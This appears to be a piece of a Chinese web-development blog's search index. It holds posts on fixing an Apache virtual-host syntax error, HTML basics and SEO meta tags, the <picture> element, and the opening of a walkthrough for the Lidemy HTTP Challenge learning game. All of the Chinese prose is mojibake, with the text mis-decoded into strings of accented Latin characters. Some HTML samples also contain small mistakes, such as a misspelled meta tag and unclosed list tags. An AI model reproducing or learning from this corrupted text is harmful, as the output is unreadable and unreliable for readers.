åŸ·è¡Œ systemctl status apache2.service ä¾†æª¢æŸ¥çœ‹çœ‹ï¼Œæ‰€ä»¥ç…§åšï¼š 1234567891011121314â— apache2.service - The Apache HTTP Server Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Tue 2022-03-08 09:14:24 UTC; 1min 3s ago Docs: https://httpd.apache.org/docs/2.4/ Process: 50421 ExecStart=/usr/sbin/apachectl start (code=exited, status=1/FAILURE)Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: Starting The Apache HTTP Server...Mar 08 09:14:24 ip-172-31-95-126 apachectl[50424]: AH00526: Syntax error on line 12 of /etc/apache2/sites-enabled/message-board.con&gt;Mar 08 09:14:24 ip-172-31-95-126 apachectl[50424]: Invalid command 'ServerName:', perhaps misspelled or defined by a module not inc&gt;Mar 08 09:14:24 ip-172-31-95-126 apachectl[50421]: Action 'start' failed.Mar 08 09:14:24 ip-172-31-95-126 apachectl[50421]: The Apache error log may have more information.Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: apache2.service: Control process exited, code=exited, status=1/FAILUREMar 08 09:14:24 ip-172-31-95-126 systemd[1]: apache2.service: Failed with result 'exit-code'.Mar 08 09:14:24 ip-172-31-95-126 systemd[1]: Failed to start The Apache HTTP Server. é›–ç„¶æ±è¥¿æœ‰é»å¤šï¼Œä½†ä»”ç´°çœ‹æœƒçœ‹åˆ°å¹¾å€‹é—œéµå­—ï¼š Syntax error on line 12 of /etc/apache2/sites-enabled/message-board.con&gt; Invalid command 'ServerName:', perhaps misspelled or defined by a module not inc&gt; å¥½ï¼Œç­”æ¡ˆå¾ˆæ˜é¡¯äº†ã€‚å¤šäº†ä¸€å€‹ã€Œå†’è™Ÿã€è€Œç”¢ç”Ÿçš„èªæ³•éŒ¯èª¤ï¼Œæ‰€ä»¥æ‹¿æ‰å¾Œå†é‡æ–°å•Ÿå‹•å°±æ­£å¸¸äº†ã€‚","link":"/2022/03/08/how-to-set-subdomain/"},{"title":"HTML åŸºç¤","text":"è¦ç°¡å–®å¾ˆç°¡å–®ï¼Œè¦è¤‡é›œä¹Ÿå¯ä»¥å¾ˆè¤‡é›œã€‚ HTML æ¶æ§‹ &lt;!DOCTYPE html&gt; =&gt; å®£å‘Šæˆ‘ç”¨çš„æ˜¯ HTML5 é€™å€‹æ ¼å¼ html =&gt; æ•´å€‹ HTML æ–‡ä»¶çš„æ ¹å…ƒç´  head =&gt; æ”¾ä¸€äº›é¡å¤–è³‡è¨Šã€‚åƒæ˜¯ç·¨ç¢¼æ ¼å¼ï¼Œå¤–éƒ¨æª”æ¡ˆä¹‹é¡çš„ title =&gt; ç¶²é çš„æ¨™é¡Œ body =&gt; ç¶²é çš„ä¸»è¦å…§å®¹ æˆå°èˆ‡ä¸æˆå°çš„æ¨™ç±¤å¤§éƒ¨åˆ†çš„ HTML æ¨™ç±¤éƒ½æœƒä»¥æˆå°å‡ºç¾ï¼Œä¾‹å¦‚ &lt;h1&gt;title&lt;/h1&gt;ã€&lt;p&gt;hahahaha&lt;/p&gt;ã€‚ ä½†æœ‰äº›æ¨™ç±¤æ˜¯æ²’æœ‰å…§å®¹çš„ï¼Œåƒæ˜¯ &lt;meta charset=\"utf-8\" /&gt; ï¼Œæ‰€ä»¥å°±æ”¹æˆåœ¨å¾Œé¢åŠ ä¸Š / å¯ä»¥æƒ³æˆæ˜¯ã€Œè‡ªå·±ä¸€çµ„ã€çš„é€™ç¨®æ¦‚å¿µã€‚ HTML ä¸€é–‹å§‹çš„ç”¨é€”ç”¨ä¾†å‘ˆç¾ã€Œæ–‡ç« ã€çš„æ„Ÿè¦ºï¼Œæ‰€ä»¥ä¸€é–‹å§‹æœ€åŸºæœ¬çš„æ¨™ç±¤æ˜¯ &lt;h1&gt;~&lt;h6&gt; è·Ÿ &lt;p&gt;ï¼Œé€™å…©ç¨®æ¨™ç±¤å…¶å¯¦å°±å¤§ç´„æ˜¯ä¸€ç¯‡æ–‡ç« çš„çµæ§‹äº†ï¼Œåˆ†åˆ¥æ˜¯ã€Œæ¨™é¡Œã€è·Ÿã€Œå…§æ–‡ã€ã€‚ æŠŠæ¨™ç±¤çµ¦åˆ†çµ„èµ·ä¾†ï¼Œ&lt;div&gt; èˆ‡ &lt;span&gt; å…©å€‹éƒ½æ˜¯ç”¨ä¾†åšã€Œåˆ†çµ„ã€é€™ä»¶äº‹æƒ…ï¼Œä¸»è¦æ˜¯åœ¨ CSS çš„æ™‚å€™æœƒç”¨åˆ°ï¼š 1234567891011121314151617181920&lt;!-- ç¬¬ä¸€çµ„ --&gt;&lt;div&gt; &lt;h2&gt;Group1&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt;&lt;!-- ç¬¬äºŒçµ„ --&gt;&lt;div&gt; &lt;h2&gt;Group2&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt; &lt;span&gt; ä¹Ÿæ˜¯åˆ†çµ„ï¼Œè·Ÿ &lt;div&gt; æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ä¸æœƒæ›è¡Œï¼Œå¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯ã€Œå¯ä»¥èˆ‡åˆ¥äººå…±è™•ï¼Œä½†åœ¨çµ„è£¡é‚„æœ‰è‡ªå·±çš„å°åœˆåœˆã€é€™ç¨®æ„Ÿè¦ºï¼š 1234567891011121314151617181920 &lt;!-- ç¬¬ä¸€çµ„ --&gt;&lt;div&gt; &lt;h2&gt;Group1&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit &lt;span&gt;æˆ‘æ˜¯ç¬¬ä¸€çµ„è£¡é¢çš„å°åœˆå­&lt;span&gt; consectetur adipisicing elit. Ipsam quidem consectetur ratione doloribus ullam iusto neque iure, ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquam totam sapiente? &lt;/p&gt;&lt;/div&gt;&lt;!-- ç¬¬äºŒçµ„ --&gt;&lt;div&gt; &lt;h2&gt;Group2&lt;/h2&gt; &lt;p&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Ipsam quidem consectetur &lt;span&gt;æˆ‘æ˜¯ç¬¬äºŒçµ„è£¡é¢çš„å°åœˆå­&lt;span&gt; doloribus ullam iusto neque iure,ea aliquam iste a quod reiciendis nam labore? Quam aperiam numquamtotam sapiente? &lt;/p&gt;&lt;/div&gt; é¡¯ç¤ºåœ–ç‰‡çš„æ¨™ç±¤ &lt;img&gt;ç”¨ &lt;img&gt; é€™å€‹æ¨™ç±¤ï¼Œä¸éä¸æ˜¯é€™æ¨£å¯«ï¼š 1&lt;img&gt;https://xxxx&lt;/img&gt; é€šå¸¸æœƒæ”¾åœ¨æ¨™ç±¤è£¡çš„å…§å®¹æ˜¯æŒ‡ã€Œç›´æ¥é¡¯ç¤ºåœ¨ç¶²é ä¸Šã€çš„æ±è¥¿ã€‚ä¾‹å¦‚èªª &lt;h2&gt;Title&lt;/h2&gt; æœƒåœ¨ç¶²é ä¸Šé¡¯ç¤º ã€ŒTitleã€ã€‚ ä½†æ˜¯åœ–ç‰‡çš„å…§å®¹æ˜¯ä¸€å€‹é€£çµï¼Œä¸æ˜¯æˆ‘å€‘çœŸæ­£æƒ³å‘ˆç¾çš„æ±è¥¿ï¼Œæ‰€ä»¥æ­£ç¢ºçš„ç”¨æ³•æ˜¯é€™æ¨£ï¼š 1&lt;img src=\"https://xxx\" /&gt; è¦ç”¨ src ä¾†å‘Šè¨´ç¶²é åœ–ç‰‡çš„é€£çµåœ¨å“ªè£¡ã€‚ title å±¬æ€§1&lt;img src=\"https://xxx\" title=\"yoyoyo\"&gt; ä»£è¡¨åœ–ç‰‡çš„æ¨™é¡Œï¼Œç•¶æ»‘é¼ åœåœ¨åœ–ç‰‡ä¸Šçš„æ™‚å€™ï¼Œæœƒé¡¯ç¤ºè¨Šæ¯ã€‚ alt å±¬æ€§alt çš„å…¨æ–‡æ˜¯ alternativeï¼ˆæ›¿ä»£ï¼‰ï¼Œç•¶åœ–ç‰‡æ²’è¾¦æ³•é¡¯ç¤ºçš„æ™‚å€™ï¼Œå°±æœƒé¡¯ç¤ºè¨­å®šåœ¨ alt ä¸­çš„æ›¿ä»£æ–‡å­—ã€‚ 1&lt;img src=\"https://xxx\" alt=\"ä½ æ€éº¼å¸¥æˆé€™æ¨£\"&gt; é¡¯ç¤ºæ¸…å–®&lt;ul&gt;ï¼ˆunordered listï¼‰ ç„¡åºæ¸…å–®ä»£è¡¨æ²’æœ‰å…ˆå¾Œé †åºçš„æ¸…å–®ï¼š 12345&lt;ul&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt;&lt;ul&gt; &lt;ol&gt;ï¼ˆordered listï¼‰ æœ‰åºæ¸…å–®ä»£è¡¨æœ‰å…ˆå¾Œé †åºçš„æ¸…å–®ï¼š 12345&lt;ol&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt; &lt;li&gt;yoyo&lt;/li&gt;&lt;ol&gt; ä¿ç•™å®Œæ•´æ ¼å¼ &lt;pre&gt; èˆ‡æ›è¡Œ &lt;br&gt;&lt;pre&gt; preformatted textåœ¨æ¨™ç±¤å…§çš„ã€Œæ›è¡Œã€ã€ã€Œç©ºç™½ã€ä¸ç®¡æœ‰å¹¾å€‹éƒ½æœƒè¢«è§£ææˆã€Œä¸€å€‹ç©ºç™½ã€ï¼Œæ‰€ä»¥å¯èƒ½æœƒè·Ÿä½ åœ¨ç·¨è¼¯å™¨è£¡é¢æ‰“çš„æ ¼å¼ä¸ä¸€æ¨£ï¼š 1&lt;p&gt; æˆ‘ å°± è¦ ç©º ä¸€ å¤§ æ ¼ &lt;/p&gt; pre å¯ä»¥å¹«ä½ æŠŠæ–‡å­—æ ¼å¼åŒ–ï¼Œä¿ç•™åŸæœ¬çš„æ ¼å¼ï¼š 1&lt;pre&gt; æˆ‘ å°± è¦ ç©º ä¸€ å¤§ æ ¼ &lt;/pre&gt; &lt;br&gt; line breakå› ç‚ºå‰›å‰›èªªã€Œæ›è¡Œã€ä¹Ÿæœƒè¢«è§£ææˆã€Œä¸€å€‹ç©ºç™½ã€ï¼Œæ‰€ä»¥çœŸçš„æƒ³æ›è¡Œçš„æ™‚å€™å¯ä»¥ç”¨ &lt;br /&gt;ï¼š 1234&lt;p&gt; ç¬¬ä¸€è¡Œ &lt;br /&gt; ä¸‹ä¸€è¡Œ&lt;p&gt; é¡¯ç¤ºè¡¨æ ¼ &lt;table&gt;æœ€å¸¸ç”¨çš„å¹¾å€‹ï¼š &lt;table&gt; =&gt; æ•´å€‹è¡¨æ ¼ &lt;caption&gt; =&gt; æ•´å€‹è¡¨æ ¼çš„æ¨™é¡Œ &lt;tr&gt; =&gt; table row è¡¨æ ¼çš„è¡Œ &lt;td&gt; =&gt; table cell è¡¨æ ¼çš„åˆ— &lt;th&gt; =&gt; table header æ¬„ä½æ¨™é¡Œ 123456789101112131415161718192021222324252627&lt;table&gt; &lt;caption&gt;ä¸€å¹´ A ç­&lt;/caption&gt; &lt;!-- ç¬¬ä¸€è¡Œï¼ˆæ¨™é¡Œï¼‰ --&gt; &lt;tr&gt; &lt;th&gt;å§“å&lt;/th&gt; &lt;th&gt;è‹±æ–‡&lt;/th&gt; &lt;th&gt;åœ‹æ–‡&lt;/th&gt; &lt;/tr&gt; &lt;!-- ç¬¬äºŒè¡Œ --&gt; &lt;tr&gt; &lt;td&gt;å°æ˜&lt;/td&gt; &lt;td&gt;80&lt;/td&gt; &lt;td&gt;90&lt;/td&gt; &lt;/tr&gt; &lt;!-- ç¬¬ä¸‰è¡Œ --&gt; &lt;tr&gt; &lt;td&gt;å°èŠ±&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;td&gt;30&lt;/td&gt; &lt;/tr&gt; &lt;!-- ç¬¬å››è¡Œ --&gt; &lt;tr&gt; &lt;td&gt;å°é‚±&lt;/td&gt; &lt;td&gt;48763&lt;/td&gt; &lt;td&gt;66666&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; å¸¶ä½ ç’°éŠä¸–ç•Œ &lt;a&gt;&lt;a&gt; anchorï¼ŒéŒ¨é»ã€‚æ¯”å–»çš„æ˜¯å¾èˆ¹ä¸Šæ‹‹å‡ºå»çš„é‚£å€‹éŒ¨ï¼Œåœ¨ç¶²é çš„ä¸–ç•Œä»£è¡¨ã€Œè¶…é€£çµã€ï¼Œåˆ†æˆå…©ç¨®ï¼š é€£åˆ°ç¶²é ã€Œå¤–é¢ã€çš„é€£çµ é€£åˆ°ç¶²é ã€Œè£¡é¢ã€çš„é€£çµ å¦å¤–è¦æ­é… href ï¼ˆhyper text referenceï¼‰å±¬æ€§ä¾†ä½¿ç”¨ï¼Œç”¨ä¾†è¨­ç½®é€£çµçš„ä½ç½®ã€‚ é€£åˆ°ç¶²é å¤–é¢çš„é€£çµ1&lt;a href=\"https://google.com\"&gt;take me to google&lt;/a&gt; å¦å¤–é‚„æœ‰ä¸€å€‹å±¬æ€§ï¼štargetï¼Œå¯ä»¥ç”¨ä¾†è¨­å®šè¦ç›´æ¥é€£åˆ°æ–°é é¢ï¼Œé‚„æ˜¯ç”¨åˆ†é ä¾†é–‹å•Ÿï¼š 12&lt;a href=\"https://google.com\" target=\"_self\"&gt;ç›´æ¥é–‹å•Ÿ&lt;/a&gt;&lt;a href=\"https://google.com\" target=\"_blank\"&gt;é–‹æ–°åˆ†é &lt;/a&gt; é€£åˆ°ç¶²é è£¡é¢çš„é€£çµé¦–å…ˆè¦åœ¨æ¨™ç±¤åŠ ä¸Š id å±¬æ€§ï¼Œé€™æ¨£ href æ‰å¯ä»¥æœ‰ã€Œåƒè€ƒé»ã€ï¼ŒçŸ¥é“è¦æŠŠä½ å¸¶åˆ°å“ªå€‹ä½ç½®ï¼š 123456&lt;!-- ç”¨æ³•æ˜¯ # + id å€¼ --&gt;&lt;a href=\"#res1\"&gt;å¸¶æˆ‘åˆ°é¤å»³1&lt;a/&gt;.........&lt;h2 id=\"res1\"&gt;é¤å»³1&lt;/h2&gt; èªæ„åŒ–æ¨™ç±¤ Semantic elementsé€™äº›å…ƒç´ åœ¨æ¸²æŸ“å¾Œçš„ç•«é¢ä¸Šçœ‹èµ·ä¾†éƒ½è·Ÿ &lt;div&gt; æ²’æœ‰å€åˆ¥ã€‚æœ€ä¸»è¦çš„ç”¨æ„æ˜¯è¦è®“äººï¼ˆå·¥ç¨‹å¸«ï¼‰æˆ–æ©Ÿå™¨ï¼ˆæœå°‹å¼•æ“ï¼‰åœ¨è®€ HTML çš„æ™‚å€™å¯ä»¥æ¯”è¼ƒæ¸…æ¥šä¸€é»ï¼Œå› ç‚ºæœ‰ã€Œèªæ„ã€ã€‚å°±è·Ÿçœ‹åˆ° &lt;h1&gt; çŸ¥é“æ˜¯æ¨™é¡Œï¼Œçœ‹åˆ° &lt;p&gt; çŸ¥é“æ˜¯å…§æ–‡ï¼Œé€™å€‹å°±æ˜¯æœ‰èªæ„çš„æ¨™ç±¤ã€‚ &lt;main&gt; æœ€ä¸»è¦çš„å…§å®¹ï¼Œä¸€å€‹ç¶²é åªæœƒæœ‰ä¸€å€‹ã€‚ &lt;header&gt; ä½œç‚ºå¾€é–‹å ´ä»‹ç´¹çš„å…§å®¹ï¼Œå¯ä»¥æ˜¯ logo æˆ–å°è®€ç¶²é çš„å…§å®¹ &lt;footer&gt; é€šå¸¸æ˜¯ copyright æˆ–ä½œè€…è³‡è¨Šç­‰ç­‰ &lt;article&gt; ä¸€å€‹æ®µè½ï¼Œé‡é»æ˜¯è¦èƒ½å¤ ã€Œç¨ç«‹ã€å­˜åœ¨ï¼Œä¸ç›¸ä¾å…¶ä»–å…§å®¹ &lt;section&gt; ä¸€å€‹æ®µè½ï¼Œå¯ä»¥ã€Œå…§åµŒã€åœ¨ &lt;article&gt; è£¡ï¼Œé€šå¸¸è¦æœ‰ã€Œæ¨™é¡Œã€ æ›´å¤šçš„èªæ„æ¨™ç±¤å¯ä»¥åƒè€ƒï¼š W3C MDN ç›´æ¥ç”¨åˆ¥äººçš„ç¶²é  &lt;iframe&gt;å¦‚é¡Œï¼Œå¯ä»¥ä½¿ç”¨ src ä¾†åµŒå…¥åˆ¥äººçš„ç¶²é ï¼š 1&lt;iframe src=\"https://jubeatt.github.io/\" width=\"80%\" height=\"500px\" style=\"display: block; margin: auto;\"&gt;&lt;/iframe&gt; å‚™è¨»ï¼šå±¬æ–¼ replace element çš„ä¸€ç¨®ï¼Œæ‰€ä»¥å¯ä»¥è¨­å®šå¯¬é«˜ã€‚ å‚™è¨»ï¼šå¯ä»¥æŠŠ replace element æƒ³æˆæ˜¯ã€Œå…§å®¹æ˜¯å¾å¤–é¢åµŒå…¥çš„ã€æœƒæ¯”è¼ƒå¥½ç†è§£ï¼Œä¾‹å¦‚åƒ &lt;img&gt;ã€&lt;iframe&gt;ã€&lt;textarea&gt; ç­‰ç­‰ã€‚ ä¸Šæœ‰æ”¿ç­– ä¸‹æœ‰å°ç­–ç‚ºäº†é¿å…äººå®¶æŠŠä½ çš„ç¶²ç«™æ‹¿å»äº‚ç”¨ï¼Œserver å¯ä»¥è¨­å®šä¸€å€‹ headerï¼šx-frame-options: SAMEORIGINã€‚åŠ äº†é€™å€‹å¾Œåˆ¥äººå°±æ²’è¾¦æ³•ç”¨ &lt;iframe&gt; ä¾†å·ä½ çš„ç¶²ç«™ä¾†ç”¨ï¼š è¡¨å–®ç›¸é—œæ¨™ç±¤&lt;input&gt; ç›¸é—œtext =&gt; è¼¸å…¥æ–‡å­—password =&gt; è¼¸å…¥å¯†ç¢¼ï¼Œè‡ªå‹•é¦¬è³½å…‹email =&gt; ç€è¦½å™¨æœƒè‡ªå‹•åšé©—è­‰ï¼Œæ‰‹æ©Ÿä¸Šçš„éµç›¤æœƒè‡ªå‹•æ·»åŠ  @ã€.com çš„æŒ‰éˆ•tel =&gt; ä¸åƒ email æœƒè‡ªå‹•é©—è­‰ï¼Œä½†æ˜¯æ‰‹æ©Ÿä¸Šçš„ UX æœƒæ¯”è¼ƒå¥½ï¼ˆéµç›¤ï¼‰date =&gt; è¼¸å…¥æ—¥æœŸradio =&gt; å–®é¸æ¡†checkbox =&gt; è¤‡é¸æ¡†submit =&gt; é€å‡ºè¡¨å–® å…¶ä»–&lt;label&gt; =&gt; æŠŠæ–‡å­—è·Ÿ input æ¨™ç±¤é—œè¯èµ·ä¾†&lt;select&gt; =&gt; ä¸‹æ‹‰å¼é¸å–®&lt;button&gt; =&gt; æŒ‰éˆ•ï¼ˆåœ¨è¡¨å–®å¤–ä¹Ÿèƒ½ä½¿ç”¨ï¼Œåªæ˜¯ä¹Ÿå¯ç”¨åœ¨è¡¨å–®ï¼‰ 1234567891011121314151617&lt;form method=\"GET\" action=\"https://a.com\"&gt; &lt;div&gt; &lt;select name=\"interesting\"&gt; &lt;option value=\"åƒé£¯\"&gt;åƒé£¯&lt;/option&gt; &lt;option value=\"çœ‹é›»å½±\"&gt;çœ‹é›»å½±&lt;/option&gt; &lt;option value=\"ç¡è¦º\"&gt;ç¡è¦º&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"æ—©ä¸Š\" id=\"æ—©ä¸Š\"&gt;&lt;label for=\"æ—©ä¸Š\"&gt;æ—©ä¸Š&lt;/label&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"ä¸­åˆ\" id=\"ä¸­åˆ\"&gt;&lt;label for=\"ä¸­åˆ\"&gt;ä¸­åˆ&lt;/label&gt; &lt;input type=\"checkbox\" name=\"time\" value=\"æ™šä¸Š\" id=\"æ™šä¸Š\"&gt;&lt;label for=\"æ™šä¸Š\"&gt;æ™šä¸Š&lt;/label&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=\"submit\" value=\"é€å‡º\"&gt; &lt;/div&gt;&lt;/form&gt; å‚™è¨»ï¼šname è·Ÿ value ä¸€å®šè¦é™„ä¸Šï¼Œé€™æœƒå°æ‡‰åˆ° server æ”¶åˆ°è¡¨å–®å¾Œçš„ key è·Ÿ valueï¼Œæ²’æœ‰çš„è©± server å°±ä¸çŸ¥é“å…§å®¹æ˜¯ä»€éº¼ã€‚ æ›´å¤š input ç¨®é¡ï¼šMDN SEOSearch Engine Optimization æœå°‹å¼•æ“å„ªåŒ–ï¼Œå¹«åŠ©æœå°‹å¼•æ“ï¼ˆdock yahoo bingï¼‰ç†è§£ä½ çš„ç¶²é åœ¨èªªä»€éº¼ã€‚ ä¸»å‹•å‘Šè¨´ã€Œæœå°‹å¼•æ“ã€ä½ çš„ç¶²é åœ¨åšä»€éº¼ï¼Œæœƒæ›´å¥½ã€‚ &lt;meta&gt; æ¨™ç±¤æœ€å¸¸è¦‹çš„å°±æ˜¯ keyword è·Ÿ descriptionï¼š 12&lt;meta name=\"keyword\" content=\"æœå°‹é—œéµå­—\"&gt;&lt;meat name=\"description\" content=\"ç¶²ç«™çš„ç°¡ä»‹\"&gt; Open Graph ProtocolFacebook æå‡ºçš„å”è­°ï¼Œéµå¾ªé€™å€‹å”è­°å°±å¯ä»¥è®“ç¶²é è¢«åˆ†äº«åˆ°ç¤¾ç¾¤ç¶²ç«™ï¼ˆè‡‰æ›¸ï¼‰ä¸Šçš„æ™‚å€™æ¯”è¼ƒäº®çœ¼ï¼Œåƒæ˜¯ç¸®åœ–ã€æ¨™é¡Œã€æè¿°ç­‰ç­‰ã€‚ 12345&lt;meta property=\"og:title\" content=\"ç¶²ç«™æ¨™é¡Œ\"&gt;&lt;meta property=\"og:description\" content=\"ä»‹ç´¹\"&gt;&lt;meta property=\"og:image\" content=\"https://xxx.com\"&gt;&lt;meta property=\"og:image:width\" content=\"500\"&gt;&lt;meta property=\"og:image:height\" content=\"400\"&gt; å¯ä»¥ç”¨ é€™å€‹ç¶²ç«™ ä¾†æŸ¥çœ‹ og æ¨™ç±¤çš„è¨­å®šæ•ˆæœã€‚ æ›´å¤šè©³ç´°å¯ä»¥åƒè€ƒ é€™å€‹ç¶²ç«™ï¼Œå¯«å¾—è »ç°¡æ½”çš„ã€‚ JSON-ldJSON-ldï¼Œå…¨åæ˜¯ JSON for Linking Dataï¼Œä¸»è¦æ˜¯çµ¦ google çœ‹çš„ã€‚ è·Ÿ Open Graph Protocol æ¦‚å¿µå·®ä¸å¤šï¼Œå°±æ˜¯ç”¨ã€Œç‰¹å®šæ ¼å¼ã€ä¾†å‘ˆç¾è³‡æ–™ï¼Œè®“æ©Ÿå™¨è·Ÿäººæ¯”è¼ƒå¥½é–±è®€ã€‚ 123456789&lt;script type=\"application/ld+json\"&gt;{ \"@context\": \"https://json-ld.org/contexts/person.jsonld\", \"@id\": \"http://dbpedia.org/resource/John_Lennon\", \"name\": \"John Lennon\", \"born\": \"1940-10-09\", \"spouse\": \"http://dbpedia.org/resource/Cynthia_Lennon\"}&lt;/script&gt; é™„ä¸Šå¹¾å€‹åƒè€ƒç¶²ç«™ï¼š å®˜æ–¹ç¶²ç«™ Google é–‹ç™¼è€…æ–‡ä»¶ ä»‹ç´¹æ–‡ç«  robots.txtçµ¦ã€Œç¶²é çˆ¬èŸ²ã€çœ‹çš„æª”æ¡ˆï¼Œåƒè€ƒé€™è£¡ã€‚ å…¶ä¸­ Disallow æ˜¯å‘Šè¨´çˆ¬èŸ²ã€Œä¸è¦çˆ¬é€™äº›æª”æ¡ˆã€ï¼ŒAllow å‰‡æ˜¯ã€Œçˆ¬é€™äº›æª”æ¡ˆã€ã€‚ Sitemap å‰‡æ˜¯æŠŠç¶²ç«™ä¸­çš„æ‰€æœ‰é€£çµç›´æ¥é™„çµ¦çˆ¬èŸ²ï¼Œè®“å®ƒå€‘èƒ½æ›´å¿«æ‰¾åˆ°æœ‰ç”¨çš„è³‡è¨Šã€‚ APP ç›¸é—œè³‡è¨Šæ•ˆæœå°±æ˜¯è·³ä¸€å€‹è¦–çª—å•ä½ è¦ä¸è¦ä¸‹è¼‰ APPï¼Ÿæˆ–æ˜¯æœ‰å®‰è£çš„è©±æœƒç›´æ¥è·³åˆ° APP è£¡ï¼š 12&lt;meta property=\"al:ios:app_name\" content=\"appåç¨±\"&gt;&lt;meta property=\"al:ios:app_store_id\" content=\"appçš„id\"&gt; è·Ÿ twitter æœ‰é—œï¼Œç”¨ twitter ç€è¦½æœƒæœ‰æ¯”è¼ƒå¥½çš„æ•ˆæœï¼š 12&lt;meta property=\"twitter:app:id:ipad\" name=\"twitter:app:id:ipad\" content=\"284876795\"&gt;&lt;meta property=\"twitter:app:id:iphone\" name=\"twitter:app:id:iphone\" content=\"284876795\"&gt;","link":"/2022/01/11/html-basic/"},{"title":"ä½¿ç”¨ <picture> ä¾†è¨­å®š RWD åœ–ç‰‡","text":"å¥½ç”¨çš„æ¨™ç±¤ã€‚ æ–¹ä¾¿ä¹‹è™•åœ¨è£½ä½œ RWD çš„æ™‚å¯èƒ½æœƒé‡å°ä¸åŒå¯¬åº¦çš„è£ç½®ä¾†æä¾›ä¸åŒå°ºå¯¸çš„åœ–ç‰‡ã€‚é™¤äº†ç”¨ media query æˆ– JavaScript ä¹‹å¤–ï¼Œé‚„å¯ä»¥åˆ©ç”¨ &lt;picture&gt; ä¾†å¯¦ç¾ï¼š 123456789&lt;picture&gt; &lt;!-- 768px ä»¥ä¸Šè¦é¡¯ç¤ºçš„åœ–ç‰‡ --&gt; &lt;source srcset=\"images/desktop/image-transform.jpg\" media=\"(min-width: 760px)\" /&gt; &lt;!-- ä¸æ”¯æ´ picture æ¨™ç±¤ï¼Œæˆ–ä¸ç¬¦åˆä¸Šé¢çš„æ¢ä»¶æ™‚å¥—ç”¨ --&gt; &lt;img src=\"images/mobile/image-transform.jpg\" /&gt;&lt;/picture&gt; ç€è¦½å™¨æœƒå…ˆå¾ &lt;source&gt; æ‰¾å‡ºåŒ¹é…åœ–ç‰‡ï¼Œå¦‚æœæ²’æœ‰ï¼ˆæˆ–ç€è¦½å™¨ä¸æ”¯æ´ &lt;picture&gt;ï¼‰å°±æœƒä½¿ç”¨ &lt;img&gt; è£¡çš„åœ–ç‰‡ã€‚ å‚™è¨»ï¼š &lt;source&gt; å¯ä»¥æœ‰å¤šå€‹ &lt;img&gt; ä¸€å®šè¦å¯«åœ¨æœ€å¾Œé¢ï¼Œå› ç‚ºå‡ºç¾åœ¨ &lt;img&gt; å¾Œçš„ &lt;source&gt; éƒ½æœƒè¢«çœç•¥","link":"/2022/01/16/html-picture-tag/"},{"title":"HTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾—","text":"ä¾†è‡ª Lidemy ä¸Šçš„å°éŠæˆ²ï¼šLidemy HTTP Challengeï¼Œå¯«ä¸€ç¯‡ç°¡çŸ­çš„æ”»ç•¥æ–‡èˆ‡å¿ƒå¾—ã€‚ é€™ä»½éŠæˆ²å…¶å¯¦èƒ½å­¸åˆ°è »å¤šæ±è¥¿çš„ï¼Œå¾ˆæ¨è–¦æ²’ç©éçš„äººå¯ä»¥å»ç©ç©çœ‹ã€‚ ç¬¬ä¸€é—œ1. é–‹å ´ä¸€é–‹å§‹çš„ token ç‚º {GOGOGO}ï¼Œç™¼ä¸€å€‹ GET è«‹æ±‚å°± OK äº†ï¼š 1234request('https://lidemy-http-challenge.herokuapp.com/lv1?token={GOGOGO}',(err, res, body) =&gt; { console.log(body) } responseï¼š 12345678å•Š...å¥½ä¹…æ²’æœ‰çœ‹åˆ°å¹´è¼•äººåˆ°æˆ‘é€™å€‹åœ–æ›¸é¤¨äº†ï¼Œæˆ‘å«åš libï¼Œæ˜¯é€™å€‹åœ–æ›¸é¤¨çš„ç®¡ç†å“¡å¾ˆé–‹å¿ƒçœ‹åˆ°æœ‰å¹´è¼•äººé¡˜æ„ä¾†å¹«å¿™ï¼Œæœ€è¿‘åœ–æ›¸é¤¨å‰›æ›äº†è³‡è¨Šç³»çµ±ï¼Œæˆ‘éƒ½æä¸æ¸…æ¥šæ€éº¼ç”¨äº†...é€™æ˜¯ä»–å€‘æä¾›çµ¦æˆ‘çš„æ–‡ä»¶ï¼Œæˆ‘ä¸€å€‹å­—éƒ½çœ‹ä¸æ‡‚ï¼Œä½†å°ä½ å¯èƒ½æœƒæœ‰å¹«åŠ©ï¼šhttps://gist.github.com/aszx87410/3873b3d9cbb28cb6fcbb85bf493b63baå…ˆæŠŠé€™æ–‡ä»¶æ”¾ä¸€æ—å§ï¼Œé€™å€‹å¾…æœƒæ‰æœƒç”¨åˆ°ä½ å«åšä»€éº¼åå­—å‘¢ï¼Ÿç”¨ GET æ–¹æ³•è·Ÿæˆ‘èªªä½ çš„ name å«åšä»€éº¼å§ï¼é™¤äº† token ä»¥å¤–é †ä¾¿æŠŠ name ä¸€èµ·å¸¶ä¸Šä¾†å°±å¯ä»¥äº† 2. è‡ªæˆ‘ä»‹ç´¹è¨˜å¾—æŠŠå‰›å‰›çš„ API ç¶²å€çµ¦è¨˜ä¸‹ä¾†ï¼Œä¹‹å¾Œæœƒç”¨åˆ°ã€‚ æ¥è‘—å°±ä¾ç…§é¡Œç›®èªªçš„ï¼Œå¸¶ä¸Š &amp;name=xxx å°±å¯ä»¥äº†ï¼š 